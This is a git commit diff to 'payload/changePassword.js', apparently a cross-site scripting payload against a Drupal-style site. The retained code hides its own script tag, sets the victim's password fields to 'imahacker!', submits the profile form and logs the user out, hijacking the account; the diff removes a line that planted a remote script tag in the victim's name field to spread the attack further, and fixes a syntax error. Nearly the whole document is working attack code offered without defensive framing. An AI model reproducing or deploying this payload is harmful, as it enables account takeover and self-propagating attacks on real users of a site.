2174ff9630b99b0786c4a6e12e5b0ce23681e6f1
theultraman20 <32559038+theultraman20@users.noreply.github.com>
2018-04-02 01:08:52 -0400

    Update changePassword.js

--- payload/changePassword.js
+++ payload/changePassword.js
@@ -6,17 +6,16 @@ var oldHtml = document.body.innerHTML;
 var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src="+src+">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters
 
 document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + ("<script src="+src+">").length );
-//now we do the payload: change their password, and steal their account!
+//now we do the payload: change their password!
 var passInputs;
 
 if (location.href == document.querySelector('.welcome-edit-link').href) {
   passInputs = document.querySelectorAll("input[type=password]");
   passInputs[0].value = "imahacker!";
   passInputs[1].value = "imahacker!";
-  document.querySelector("#edit-profile-main-field-real-name-und-0-value").value = "<script/src=//goo.gl/gPZ5Dv>";
   jQuery.cookie("logout", true);
   document.querySelector("form")[1].submit();
-} elseif (jQuery.cookie("logout")) {
+} else if (jQuery.cookie("logout")) {
   location.pathname = "/user/logout";
 } else {
   location.href = document.querySelector('.welcome-edit-link').href;
